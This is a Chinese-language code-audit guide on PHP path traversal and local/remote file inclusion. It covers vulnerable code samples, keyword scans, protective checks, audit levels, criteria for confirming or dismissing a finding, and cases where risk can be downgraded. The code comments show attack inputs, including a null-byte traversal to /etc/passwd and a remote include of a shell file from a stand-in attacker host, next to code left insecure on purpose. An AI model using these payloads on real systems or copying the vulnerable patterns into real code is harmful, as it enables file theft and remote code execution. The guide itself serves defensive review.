# PHP 路径遍历与文件包含漏洞

## Details

### 漏洞成因
PHP 应用常使用 `include`、`require`、`include_once`、`require_once`、`file_get_contents`、`fopen`、`readfile` 等函数加载或输出文件。当直接将用户输入拼接到文件路径，且未做白名单或路径净化时，攻击者可利用 `../`、绝对路径、`php://` 流、`zip://`、`phar://`、URL 包装器等手段实现目录遍历或本地/远程文件包含。若 `allow_url_fopen` 或 `allow_url_include` 启用，攻击者甚至可通过远程 URL 注入 PHP 代码。上传处理、模板切换、插件安装、语言包加载等功能尤其高危。

### 代码示例

**易受攻击的代码（模板切换）：**
```php
<?php
$template = $_GET['tpl'];  // tpl=../../../../etc/passwd%00
include "templates/" . $template . ".php";
```

**文件下载接口：**
```php
<?php
$file = $_GET['file']; // file=../../config.php
$path = "/var/www/uploads/" . $file;

if (!file_exists($path)) {
    http_response_code(404);
    exit;
}
readfile($path);
```

**远程文件包含（RFI）：**
```php
<?php
// allow_url_include=On
$page = $_GET['page']; // http://attacker.com/shell.txt
include $page;
```

### 快速定位技巧

#### 核心操作定位（审计等级：L1-L2）
**关键词扫描：**
- 文件包含：`include`, `require`, `include_once`, `require_once`
- 文件访问：`fopen`, `readfile`, `file_get_contents`, `file_put_contents`
- 路径拼接：`.` 拼接、`sprintf`, `basename`
- 上传/插件：`move_uploaded_file`, `ZipArchive`, `Phar`
- 配置：`allow_url_fopen`, `allow_url_include`

**定位步骤：**
1. 搜索包含函数与 `$_GET`, `$_POST`, `$_REQUEST`, `$_FILES`, `$_COOKIE` 等输入共现的代码。
2. 检查模板加载、语言包、主题切换、插件安装等动态 include 场景。
3. 跳读（L2）确认是否存在 `basename`, `realpath`, 白名单映射等防护。

#### 保护机制定位（审计等级：L2-L3）
**检查是否存在：**
- **路径标准化：** `realpath`, `dirname`, `pathinfo`
- **前缀校验：** 比较 `strpos($canonical, $base) === 0`
- **白名单映射：** 使用数组映射模板名称到文件
- **扩展名校验：** `pathinfo($file, PATHINFO_EXTENSION)`
- **禁用远程协议：** `allow_url_include=Off`, `allow_url_fopen=Off`
- **上传处理：** 验证解压条目的 canonical path

**定位技巧：**
- 确认 `realpath` 返回值真实使用；若返回 `false` 是否拒绝请求。
- 检查 `basename` 是否足够（无法阻挡 `..`），应配合白名单。
- 对 `ZipArchive` 解压使用 `addFromString`/`extractTo` 时，验证条目路径。

#### 审计等级标注
| 场景 | 审计等级 | 说明 |
|------|----------|------|
| 白名单映射 + 固定模板 | **L0（快速跳过）** | 用户输入仅为键值 |
| `realpath` + 前缀校验 | **L2（跳读）** | 确认校验逻辑完备 |
| 直接 include 用户输入 | **L3（逐行读）** | 极高风险 |
| 启用远程包含/上传解压 | **L4（跨模块追踪）** | 需全链路分析 |

## Classify

### 研判标准

#### 确认漏洞
满足以下条件判定为漏洞：
1. **用户可控路径或 URL** 用于文件包含/访问。
2. **缺乏有效防护**（无标准化、白名单、协议限制）。
3. **访问敏感资源或执行任意代码**（读取配置、包含恶意脚本、覆盖文件）。

#### 误报
可视为误报的情况：
1. **输入仅用于索引白名单数组**，返回固定文件。
2. **路径经 `realpath` 并验证起始目录**。
3. **使用 `include` 加载固定常量或内部构造值**。

#### 代码异味
需记录的潜在问题：
1. **仅使用 `basename` 去除目录**，仍可利用双写或编码绕过。
2. **允许自定义协议**（未禁用 `phar://`, `php://` 等）。
3. **上传后直接包含/执行，未走安全中转**。
4. **依赖前端验证或 `.htaccess` 规则**，缺乏后端防护。

## Low risk

### 低风险评级场景

#### 1. 受控后台操作
- **场景：** 功能仅对受信任管理员开放。
- **风险评估：** 外部攻击面小，但需防账号滥用。

#### 2. 只读公开目录
- **场景：** 仅访问公开静态资源，无敏感信息。
- **风险评估：** 危害有限，但仍可能泄露目录结构。

#### 3. PHP 配置限制
- **场景：** 禁用远程协议、使用 open_basedir 限制。
- **风险评估：** 可降低风险，但并非万无一失。

#### 4. 容器/沙箱隔离
- **场景：** 应用运行在限制权限的容器或 chroot 中。
- **风险评估：** 限制破坏面，但建议修复代码。

### 风险降级条件总结
| 条件 | 降级理由 | 建议优先级 |
|------|----------|------------|
| 管理员限定 | 攻击面小 | 中 |
| `realpath` + 起始目录校验 | 有效防护 | 低 |
| open_basedir/禁用远程协议 | 增加防线 | 中 |
| 容器/沙箱运行 | 限制影响面 | 高（持续跟进修复）|

